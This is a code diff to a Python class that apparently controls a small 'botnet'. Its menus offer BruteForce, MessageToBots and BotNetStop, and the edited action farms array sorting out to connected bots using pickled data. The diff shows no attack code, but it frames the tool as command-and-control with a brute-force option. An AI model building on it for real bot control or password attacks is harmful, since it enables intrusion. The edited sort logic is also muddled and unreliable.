@@ -117,14 +117,14 @@ class Network:
                "#(p)    PrintBots    (p)#\n" \
                "#(PC)  ComputerInfo (PC)#\n" \
                "#(e)      EXIT       (e)#\n" \
-               "#########Choice#########\n"
+               "#########Choice##########\n"
 
     def __ActionInfo(self):
         return "#########Choice#########\n" \
                "#(b) BruteForce     (b)#\n" \
                "#(s) SortArray      (s)#\n" \
                "#(m) MessageToBots  (m)#\n" \
-               "#(E) BotNetStop     (E)#\n" \
+               "#(BE) BotNetStop   (BE)#\n" \
                "#(e)    Back        (e)#\n" \
                "#########Choice#########\n"
 
@@ -313,14 +313,14 @@ class Network:
                 case "S":
                     array = self.TCP_GET(ip=self.server, port=self.reserved_port)
                     if self.GPU is not None:
-                        if ["RTX", "GTX"] in self.GPU["Info"]:
-                            array = Sort.sort_gpu_cuda()
-                        else:
+                        # if ["RTX", "GTX"] in self.GPU["Info"]:
+                        #     array = Sort.sort_gpu_cuda()
+                        # else:
                             array = Sort.sort_gpu(array)
-                    elif self.CPU["cores"] >= 2:
-                        array = Sort.merge_sort_parallel(array)
-                    else:
-                        array = Sort.merge_sort(array)
+                    # if self.CPU["cores"] >= 2:
+                    #     array = Sort.merge_sort_parallel(array)
+                    # else:
+                    array = Sort.merge_sort(array)
                     print(len(array))
                     server_socket.sendto(pickle.dumps({"Action": "W", "PKG": len(array)}), (self.server, self.port))
                     self.TCP_SEND(ip=self.server, port=self.reserved_port, array=array)
